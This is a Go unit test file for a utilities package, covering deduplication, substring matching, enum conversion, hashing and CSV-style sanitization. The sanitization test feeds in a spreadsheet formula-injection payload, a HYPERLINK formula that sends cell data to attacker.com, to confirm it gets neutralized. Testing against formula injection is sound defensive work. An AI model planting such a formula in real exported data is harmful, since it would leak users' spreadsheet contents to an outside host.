package utils

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestUtils_RemoveDuplicates(t *testing.T) {
	values := []int64{1, 1, 2}
	expected := []int64{1, 2}
	actual := RemoveDuplicates(values)
	assert.Equal(t, expected, actual)
}

func TestUtils_ContainsI(t *testing.T) {
	assert.True(t, ContainsI("hello", "HELLO"))
	assert.True(t, ContainsI("hello", "ell"))
	assert.False(t, ContainsI("hello", "world"))
}

func TestUtils_EnumsToStrings(t *testing.T) {
	type Enum string
	values := []Enum{"hello", "world"}
	expected := []string{"hello", "world"}
	actual, err := EnumsToStrings(values)
	assert.NoError(t, err)
	assert.Equal(t, expected, actual)
}

func TestUtils_SanitizeString(t *testing.T) {
	values := []string{"hello", `=HYPERLINK("https://attacker.com/evil.html?data="&A1`, `repo-name.test`}
	expected := []string{`"'hello"`, `"'=HYPERLINK(""https://attacker.com/evil.html?data=""&A1"`, `"'repo-name.test"`}
	actual := make([]string, 0, len(values))

	for _, value := range values {
		actual = append(actual, SanitizeString(value, false))
	}
	assert.Equal(t, expected, actual)
}

func TestUtils_SanitizeStringNumerical(t *testing.T) {
	values := []string{"1", `=2`, `0.5`}
	expected := []string{`1`, `"'=2"`, `0.5`}
	actual := make([]string, 0, len(values))

	for _, value := range values {
		actual = append(actual, SanitizeString(value, true))
	}
	assert.Equal(t, expected, actual)
}

func TestUtils_GetHash(t *testing.T) {
	values := []int64{1, 2, 3, 4}
	expected := "a30df9e88cc1328e86964ec4e805cac906c84e512e98d34c4d5064ee70d529a9"
	actual := GetHash(values)

	assert.Equal(t, expected, actual)
}
